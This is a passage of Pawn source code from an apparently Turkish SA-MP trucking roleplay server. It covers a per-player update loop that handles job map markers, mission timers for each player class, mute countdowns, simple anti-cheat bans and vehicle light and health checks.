							if(BayrakMesaj[playerid] == 0)
						    {
							    SendClientMessage(playerid,-1," BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR . ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{FF0000} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{00FF00} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        BayrakMesaj[playerid] = 1;
								SetPlayerMapIcon(playerid, 19, 2871.1563,2650.7939,10.9269, 19, 0, 3);
							}
						}
						// LONGWAY 129 - 132
							case 129,130,131,132:
						{
							if(BayrakMesaj[playerid] == 0)
						    {
							    SendClientMessage(playerid,-1," BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR . ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{FF0000} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{00FF00} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        BayrakMesaj[playerid] = 1;
								SetPlayerMapIcon(playerid, 19, -1636.1342,-2749.2307,46.6490, 19, 0, 3);
							}
						}
						// KASTAMONU 134 - 140 - (87)
						case 87,134,135,136,137,138,139,140:
						{
							if(BayrakMesaj[playerid] == 0)
						    {
							    SendClientMessage(playerid,-1," BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR . ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{FF0000} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{00FF00} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        BayrakMesaj[playerid] = 1;
								SetPlayerMapIcon(playerid, 19, -2856.6870,468.6523,3.9827, 19, 0, 3);
							}
						}
						// EMKATU 165 - 166
						case 165,166:
						{
							if(BayrakMesaj[playerid] == 0)
						    {
							    SendClientMessage(playerid,-1," BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR . ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{FF0000} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{00FF00} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        BayrakMesaj[playerid] = 1;
								SetPlayerMapIcon(playerid, 19, -1416.9760,2721.6384,61.6198, 19, 0, 3);
							}
						}
						// TUGAYOGULLARI 178 - 179
							case 178,179:
						{
							if(BayrakMesaj[playerid] == 0)
						    {
							    SendClientMessage(playerid,-1," BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR . ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{FF0000} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{00FF00} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        BayrakMesaj[playerid] = 1;
								SetPlayerMapIcon(playerid, 19, -1481.4061,2733.9946,65.5982, 19, 0, 3);
							}
						}
						// KONYA  180 - 186
						case 180,181,182,183,184,185,186:
						{
							if(BayrakMesaj[playerid] == 0)
						    {
							    SendClientMessage(playerid,-1," BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR . ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{FF0000} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{00FF00} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        BayrakMesaj[playerid] = 1;
								SetPlayerMapIcon(playerid, 19, 2182.5376,-2495.9475,13.0988, 19, 0, 3);
							}
						}
						// ANTALYA 187 - 192
					    case 187,188,189,190,191,192:
						{
	    					if(BayrakMesaj[playerid] == 0)
						    {
							    SendClientMessage(playerid,-1," BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR . ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{FF0000} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{00FF00} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        BayrakMesaj[playerid] = 1;
								SetPlayerMapIcon(playerid, 19, 370.3138,-1654.2665,32.7043, 19, 0, 3);
							}
						}
	 					// ANKARA 193
					    case 193:
						{
	    					if(BayrakMesaj[playerid] == 0)
						    {
							    SendClientMessage(playerid,-1," BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR . ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{FF0000} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{00FF00} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        BayrakMesaj[playerid] = 1;
								SetPlayerMapIcon(playerid, 19, -2608.35, -2309.60,   10.75, 19, 0, 3);
							}
						}

	 					// DÜZCE 194
					    case 194:
						{
	    					if(BayrakMesaj[playerid] == 0)
						    {
							    SendClientMessage(playerid,-1," BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR . ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{FF0000} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{00FF00} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        BayrakMesaj[playerid] = 1;
								SetPlayerMapIcon(playerid, 19, -2948.03, -1357.65,   11.52, 19, 0, 3);
							}
						}
					}
				}
				else if(APlayerData[playerid][JobStep] == 2)
	  			{
	             	switch(APlayerData[playerid][JobLoc2]) // bosaltma id
					{
	                // YENI TUGIS  106 - 111
						case 106,107,108,109,110,111:
						{
						    if(BayrakMesaj2[playerid] == 0)
						    {
						    SendClientMessage(playerid,-1," BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR . ILK ONCE BAYRAGA GIDINIZ !!!!");
	                        SendClientMessage(playerid,-1,"{FF0000} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
	                        SendClientMessage(playerid,-1,"{00FF00} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
	                        BayrakMesaj2[playerid] = 1;
							SetPlayerMapIcon(playerid, 19, 2900.0908,-790.8617,10.6765, 19, 0, 3);
			 				}
						}
						// MADISON 112 - 116
						case 112,113,114,115,116:
						{
	     					if(BayrakMesaj2[playerid] == 0)
						    {
							    SendClientMessage(playerid,-1," BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR . ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{FF0000} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{00FF00} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        BayrakMesaj2[playerid] = 1;
								SetPlayerMapIcon(playerid, 19, 2182.5376,-2495.9475,13.0988, 19, 0, 3);
							}
						}
						// MUROLAND 117 - 118
						case 117,118:
						{
	    					if(BayrakMesaj2[playerid] == 0)
						    {
							    SendClientMessage(playerid,-1," BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR . ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{FF0000} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{00FF00} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        BayrakMesaj2[playerid] = 1;
								SetPlayerMapIcon(playerid, 19, 219.1237,2758.3276,59.4508, 19, 0, 3);
							}
						}
						// ISTANBUL 119 - 123
						case 119,120,121,122,123:
						{
	    					if(BayrakMesaj2[playerid] == 0)
						    {
							    SendClientMessage(playerid,-1," BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR . ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{FF0000} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{00FF00} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        BayrakMesaj2[playerid] = 1;
								SetPlayerMapIcon(playerid, 19, 831.7585,-1792.2384,13.6284, 19, 0, 3);
							}
						}
						// HARBOUR 124 - 125
						case 124,125:
						{
	    					if(BayrakMesaj2[playerid] == 0)
						    {
							    SendClientMessage(playerid,-1," BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR . ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{FF0000} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{00FF00} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        BayrakMesaj2[playerid] = 1;
								SetPlayerMapIcon(playerid, 19, 2127.3677,2782.1306,10.7141, 19, 0, 3);
							}
						}
						// DIVER 126 - 128
							case 126,127,128:
						{
							if(BayrakMesaj2[playerid] == 0)
						    {
							    SendClientMessage(playerid,-1," BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR . ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{FF0000} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{00FF00} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        BayrakMesaj2[playerid] = 1;
								SetPlayerMapIcon(playerid, 19, 2871.1563,2650.7939,10.9269, 19, 0, 3);
							}
						}
						// LONGWAY 129 - 132
							case 129,130,131,132:
						{
							if(BayrakMesaj2[playerid] == 0)
						    {
							    SendClientMessage(playerid,-1," BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR . ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{FF0000} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{00FF00} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        BayrakMesaj2[playerid] = 1;
								SetPlayerMapIcon(playerid, 19, -1636.1342,-2749.2307,46.6490, 19, 0, 3);
							}
						}
						// KASTAMONU 134 - 140 - (87)
						case 87,134,135,136,137,138,139,140:
						{
							if(BayrakMesaj2[playerid] == 0)
						    {
							    SendClientMessage(playerid,-1," BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR . ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{FF0000} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{00FF00} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        BayrakMesaj2[playerid] = 1;
								SetPlayerMapIcon(playerid, 19, -2856.6870,468.6523,3.9827, 19, 0, 3);
							}
						}
						// EMKATU 165 - 166
						case 165,166:
						{
							if(BayrakMesaj2[playerid] == 0)
						    {
							    SendClientMessage(playerid,-1," BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR . ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{FF0000} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{00FF00} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        BayrakMesaj2[playerid] = 1;
								SetPlayerMapIcon(playerid, 19, -1416.9760,2721.6384,61.6198, 19, 0, 3);
							}
						}
						// TUGAYOGULLARI 178 - 179
							case 178,179:
						{
							if(BayrakMesaj2[playerid] == 0)
						    {
							    SendClientMessage(playerid,-1," BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR . ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{FF0000} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{00FF00} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        BayrakMesaj2[playerid] = 1;
								SetPlayerMapIcon(playerid, 19, -1481.4061,2733.9946,65.5982, 19, 0, 3);
							}
						}
						// KONYA  180 - 186
						case 180,181,182,183,184,185,186:
						{
							if(BayrakMesaj2[playerid] == 0)
						    {
							    SendClientMessage(playerid,-1," BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR . ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{FF0000} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{00FF00} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        BayrakMesaj2[playerid] = 1;
								SetPlayerMapIcon(playerid, 19, 2182.5376,-2495.9475,13.0988, 19, 0, 3);
							}
						}
						// ANTALYA 187 - 192
					    case 187,188,189,190,191,192:
						{
	    					if(BayrakMesaj2[playerid] == 0)
						    {
							    SendClientMessage(playerid,-1," BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR . ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{FF0000} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{00FF00} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        BayrakMesaj2[playerid] = 1;
								SetPlayerMapIcon(playerid, 19, 370.3138,-1654.2665,32.7043, 19, 0, 3);
							}
						}

	 					// ANKARA 193
					    case 193:
						{
	    					if(BayrakMesaj2[playerid] == 0)
						    {
							    SendClientMessage(playerid,-1," BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR . ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{FF0000} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{00FF00} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        BayrakMesaj2[playerid] = 1;
								SetPlayerMapIcon(playerid, 19, -2608.35, -2309.60,   10.75, 19, 0, 3);
							}
						}

	 					// DÜZCE 194
					    case 194:
						{
	    					if(BayrakMesaj2[playerid] == 0)
						    {
							    SendClientMessage(playerid,-1," BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR . ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{FF0000} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{00FF00} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        BayrakMesaj2[playerid] = 1;
								SetPlayerMapIcon(playerid, 19, -2948.03, -1357.65,   11.52, 19, 0, 3);
							}
						}
					}
				}
				else if(APlayerData[playerid][JobStep] == 0)
				{
	   				BayrakMesaj[playerid] = 0;
	   				BayrakMesaj2[playerid] = 0;
	                RemovePlayerMapIcon(playerid,19);
				}

	     	if(SilahIzni[playerid] != 1)
		 	{
		 	    if(g_Flags[playerid] & e_Play)
		 	    {
		 	    }else if (APlayerData[playerid][PlayerClass] != ClassFBY && PlayerPBing[playerid] == false) {
		 				 ResetPlayerWeapons(playerid);
				}
		 	}
		 	
		 	//
		    if(SilahIzni[playerid] != 1)
		 	{
  				if(g_Flags[playerid] & e_Play)
		 	    {
		 	    }else if (APlayerData[playerid][PlayerClass] != ClassFBY && PlayerPBing[playerid] == false) {
		 				 ResetPlayerWeapons(playerid);
				}
		 	}
			if(OyuncuDaKaydet == true)
			{
  				Oyuncu_Kaydet(playerid);
			}
			// Get the vehicle-id's from this player
			OldVehicleID = APlayerData[playerid][VehicleID];
			NewVehicleID = GetPlayerVehicleID(playerid);
			OldTrailerID = APlayerData[playerid][TrailerID];
			NewTrailerID = GetVehicleTrailer(GetPlayerVehicleID(playerid));

			if(APlayerData[playerid][PlayerScore] >= 250)
			{
			OnayliOyuncu[playerid] = 1;
			}

			if(APlayerData[playerid][JobStarted] == true)
			{
			    GorevTime[playerid]++;
			}

			if(APlayerData[playerid][Muted] > 0)
			{
			    APlayerData[playerid][Muted]--;
			    if(APlayerData[playerid][Muted] == 0)
			    {
			        SendClientMessage(playerid, -1, "{80FFFF}Susma cezanýzýn süresi bitti. Artýk mesaj yazabilirsiniz.");
			    }
			}

			// V5 Oyuncu Arayüzü
			UpdatePlayerV5UI(playerid);
			/*MPUI_Update(playerid);*/

		    // TMMobile Sistemi
			format(TMMYazi, 50, ":::: %s:%s", SifirKoy(saat), SifirKoy(dakika));
			PlayerTextDrawSetString(playerid, TMM_Saat[playerid], TMMYazi);

			PlayerTextDrawSetString(playerid, TMM_HS1[playerid], SifirKoy(saat));
			PlayerTextDrawSetString(playerid, TMM_HS2[playerid], SifirKoy(dakika));

			format(TMMYazi, 50, "%d %s %d", gun, Aylar[ay-1], yil);
			PlayerTextDrawSetString(playerid, TMM_HT[playerid], TMMYazi);

			// Ramazan Vakitleri Sistemi
			ShowRamazanUI(playerid);

			// Anadolu Island GAPIlarý
			GAPIKontrol(playerid);

			// Otobüsçülük Mesleði
			BusDriver_ControlMission(playerid);

			// Gemicilik Mesleði
			Gemici_ControlMission(playerid);

			// Odunculuk Mesleði
			Oduncu_ControlKesim(playerid);

			// Balýkçý Mesleði
			Balikci_ControlMission(playerid);

			// Rekor Sistemi
			OyunSuresiVer(playerid);

			// AirBalloon Sistemi Jetpack Fix
			if (APlayerData[playerid][PlayerLevel] < 1 && Root[playerid] == 0 && Balonda[playerid] == false)
			{
				if (GetPlayerSpecialAction(playerid) == 2)
				{
            		new Float:aX, Float:aY, Float:aZ;
            		GetPlayerPos(playerid, aX, aY, aZ);
					SetPlayerPos(playerid, aX, aY, aZ+0.3);
				}
			}

			if(GetPlayerSpecialAction(playerid) != 2 && Balonda[playerid] == true)
  			{
   				BalonSil(playerid);
			}

			// Check the class of the player
			switch (APlayerData[playerid][PlayerClass])
			{
				case ClassTruckDriver:
				{
				    // Check if the trucker has a job
				    if (APlayerData[playerid][JobStarted] == true)
				    {
						// Check if the vehicletimer didn't run out yet
						if (APlayerData[playerid][VehicleTimerTime] != 0)
						{
							// If VehicleID and TrailerID are still the same as when the player accepted the job
							if ((GetPlayerState(playerid) == PLAYER_STATE_DRIVER) && (OldVehicleID == NewVehicleID) && (OldTrailerID == NewTrailerID))
								APlayerData[playerid][VehicleTimerTime] = Job_TimeToFailMission; // Reset the time before the mission fails
							else // One (or both) aren't still the same (player lost his trailer or vehicle)
								PlayerLeftVehicle(playerid); // Inform the player that he left his vehicle and that he must re-enter it
						}
						else // Time left has reached 0
							FailJob(playerid);
				    }
				}
				case ClassBusDriver:
				{

				}
				case ClassMafia:
				{
				    // Check if the mafia has a job
				    if (APlayerData[playerid][JobStarted] == true)
				    {
						if (APlayerData[playerid][VehicleTimerTime] != 0)
						{
							// If VehicleID is still the same as when the player accepted the job
							if ((GetPlayerState(playerid) == PLAYER_STATE_DRIVER) && (OldVehicleID == NewVehicleID))
								APlayerData[playerid][VehicleTimerTime] = Job_TimeToFailMission; // Reset the time before the mission fails
							else // Player left his vehicle
								PlayerLeftVehicle(playerid); // Inform the player that he left his vehicle and that he must re-enter it
						}
						else // Time left has reached 0
							FailJob(playerid);
					}
				}
				case ClassBanka:
				{
				    // Check if the mafia has a job
				    if (APlayerData[playerid][JobStarted] == true)
				    {
						if (APlayerData[playerid][VehicleTimerTime] != 0)
						{
							// If VehicleID is still the same as when the player accepted the job
							if ((GetPlayerState(playerid) == PLAYER_STATE_DRIVER) && (OldVehicleID == NewVehicleID))
								APlayerData[playerid][VehicleTimerTime] = Job_TimeToFailMission; // Reset the time before the mission fails
							else // Player left his vehicle
								PlayerLeftVehicle(playerid); // Inform the player that he left his vehicle and that he must re-enter it
						}
						else // Time left has reached 0
							FailJob(playerid);
					}
				}
				case ClassRoadWorker:
				{
				    // Check if the roadworker has a job
				    if (APlayerData[playerid][JobStarted] == true)
				    {
						// Check if the vehicletimer didn't run out yet
						if (APlayerData[playerid][VehicleTimerTime] != 0)
						{
							// If VehicleID and TrailerID are still the same as when the player accepted the job
							// In case of the "tow broken vehicle" jobtype, the mission starts without a trailer (so it's 0),
							// but gets updated when the player enters the checkpoint to set the broken vehicle as trailer
							if ((GetPlayerState(playerid) == PLAYER_STATE_DRIVER) && (OldVehicleID == NewVehicleID) && (OldTrailerID == NewTrailerID))
								APlayerData[playerid][VehicleTimerTime] = Job_TimeToFailMission; // Reset the time before the mission fails
							else // VehicleID isn't still the same (player lost his vehicle or trailer)
								PlayerLeftVehicle(playerid); // Inform the player that he left his vehicle and that he must re-enter it
						}
						else // Time left has reached 0
							FailJob(playerid);
					}
				}
    				case ClassPboy:
				{
				    // Check if the mafia has a job
				    if (APlayerData[playerid][JobStarted] == true)
				    {
						if (APlayerData[playerid][VehicleTimerTime] != 0)
						{
							// If VehicleID is still the same as when the player accepted the job
							if ((GetPlayerState(playerid) == PLAYER_STATE_DRIVER) && (OldVehicleID == NewVehicleID))
								APlayerData[playerid][VehicleTimerTime] = Job_TimeToFailMission; // Reset the time before the mission fails
							else // Player left his vehicle
								PlayerLeftVehicle(playerid); // Inform the player that he left his vehicle and that he must re-enter it
						}
						else // Time left has reached 0
							FailJob(playerid);
					}
				}
				case ClassDolmusDriver:
				{
				    // Check if the Dolmusdriver has a job
				    if (APlayerData[playerid][JobStarted] == true)
				    {
						if (APlayerData[playerid][VehicleTimerTime] != 0)
						{
							// If VehicleID is still the same as when the player accepted the job
							if ((GetPlayerState(playerid) == PLAYER_STATE_DRIVER) && (OldVehicleID == NewVehicleID))
								APlayerData[playerid][VehicleTimerTime] = Job_TimeToFailMission; // Reset the time before the mission fails
							else // Player got out of his Dolmus
								PlayerLeftVehicle(playerid); // Inform the player that he left his vehicle and that he must re-enter it
						}
						else // Time left has reached 0
							FailJob(playerid);
					}
				}
			}

			// Anti RCON Hack
			if(IsPlayerAdmin(playerid) && Root[playerid] == 0)
			{
			    format(Yazi, 128, "{FF0000}%s {F8F8FF}sunucudan yasaklandý. [ RCON Hack ]", GetName(playerid));
				SendClientMessageToAll(-1, Yazi);
				SafeBan(playerid);
			}

			// Anti FakeKill
			if(OlumDurdur[playerid] > 0)
			{
			    OlumDurdur[playerid]--;
			}

			// Anti Teleport Sistemi
            //if(BirSureBakmaTamam[playerid] == 1) ControlAntiTeleport(playerid);

			// VIP Sistemi
			VIPControl(playerid);

			// Rank Sistemi
			RankControl(playerid);
			MeslekControl(playerid);

			// BoomBox Sistemi
			RefreshPlayerBoomBox(playerid);

            if(APlayerData[playerid][Overloaded] == true && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
			{
				if(asiriyazi[playerid] == 0)
				{
					new yazdirir[256];
					format(yazdirir,sizeof(yazdirir), "{FFFF00} AÞIRI YUKLU");
		   			AsiriLabel[playerid] =  Create3DTextLabel( yazdirir, 0xFF0000FF, 0, 0, 0, 40.0, 0, 0);
					Attach3DTextLabelToVehicle(AsiriLabel[playerid], GetPlayerVehicleID(playerid), 0.0, 0.0, 1.5);
					asiriyazi[playerid] = 1;
				}
			}

			// Para Gönderme Kýsýtlamasý
			if(ParaVerTimer[playerid] > 0) ParaVerTimer[playerid]--;
			if(BParaVerTimer[playerid] > 0) BParaVerTimer[playerid]--;

			// Þirket Sistemi
			if(SirketDorse[playerid] != -1)
			{
				if(GetVehicleModel(SirketDorse[playerid]) == 0)
				{
				    SirketDorse[playerid] = -1;
				}
			}

			// Meto ile Sabah Sabah :D
 			if(g_Flags[playerid] & e_Play)
		 	{
		 	}else{
		 	    if (APlayerData[playerid][PlayerClass] == ClassFBY)
				{
				}
				else
				{
		 		if(SilahIzni[playerid] == 0)
		 		{
		 			if(g_Flags[playerid] & e_Play)
			 	    {
			 	    }else if (APlayerData[playerid][PlayerClass] != ClassFBY && PlayerPBing[playerid] == false) {
			 				 ResetPlayerWeapons(playerid);
					}
		 		}
		 		}
			}

 			if(KomutZaman[playerid] >= 1)
			{
		    	KomutZaman[playerid]++;
		    	if(KomutZaman[playerid] >= 5)
		    	{
		    		KomutZaman[playerid] = 0;
		    	}
			}

			if(FloodZaman[playerid] == 1)
			{
		    	FloodZaman[playerid]++;
		    	if(FloodZaman[playerid] >= 2)
		    	{
		    		FloodZaman[playerid] = 0;
		    	}
			}

			if(ReqSpawnDurdur[playerid] > 0)
			{
			    ReqSpawnDurdur[playerid]--;
			}

			if(IsPlayerInAnyVehicle(playerid))
			{
				vehid = GetPlayerVehicleID(playerid);
				GetVehicleParamsEx(vehid, engine, light, alarm, doors, bonnet, boot, objective);
	    		if(IsVehicleDrivingBackwards( GetPlayerVehicleID(playerid) ))
	    		{
		    		new hidrolikci;
		 			hidrolikci = GetVehicleComponentInSlot(GetPlayerVehicleID(playerid), CARMODTYPE_HYDRAULICS);
		 			if (hidrolikci != 1087 && IsPlayerInVehicle(playerid,vehid))
		  			{
						SetVehicleParamsEx(vehid, engine, 1, 1, doors, bonnet, boot, objective);
	   				}
	    		}
	    		else
	    		{
					if(Flashing[vehid] == true && APlayerData[playerid][PlayerClass] != ClassPolice)
					{
						KillTimer(FlashTime[vehid]);
 						Flashing[vehid] = false;
					}
					SetVehicleParamsEx(vehid, engine, 1, 0, doors, bonnet, boot, objective);
	    		}
			}

	    	if(IsPlayerInAnyVehicle(playerid))
	    	{
	        	new Float:araccan;
				vehid = GetPlayerVehicleID(playerid);
	        	GetVehicleHealth(vehid,araccan);
	        	GetVehicleParamsEx(vehid, engine, light, alarm, doors, bonnet, boot, objective);
				if(araccan <= 300)
   				{
